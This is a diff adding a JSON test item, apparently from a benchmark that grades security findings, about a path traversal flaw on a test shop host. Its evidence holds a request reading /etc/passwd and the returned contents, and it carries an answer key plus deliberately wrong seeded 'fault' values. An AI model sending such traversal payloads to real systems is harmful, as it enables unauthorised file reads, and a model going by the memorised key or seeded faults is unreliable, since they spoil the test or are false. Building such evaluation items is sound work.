@@ -1,0 +1,31 @@
+{
+  "id": "path-traversal-downloads",
+  "split": "dev",
+  "title": "Path traversal in file download endpoint",
+  "asset": "https://shop.acme.test/api/download",
+  "notes": "Arbitrary file read via path traversal in GET /api/download?file=../../../../etc/passwd.\nAttacker can read system files (/etc/passwd, application configuration) without authentication.",
+  "evidence": [
+    {
+      "name": "path-traversal.png",
+      "file": "assets/path-traversal.png",
+      "text": "GET /api/download?file=../../../../etc/passwd HTTP/1.1\nHost: shop.acme.test\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\n\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1001:1001:Shop Admin:/home/admin:/bin/bash"
+    }
+  ],
+  "gold": {
+    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cwe": [
+      "22"
+    ],
+    "cves": [],
+    "secrets": [],
+    "score": 7.5,
+    "severity": "High"
+  },
+  "faults": {
+    "cwe": "99999",
+    "severity_text": "Low",
+    "fake_claim": true
+  },
+  "seeded_secrets": [],
+  "tool_output": ""
+}
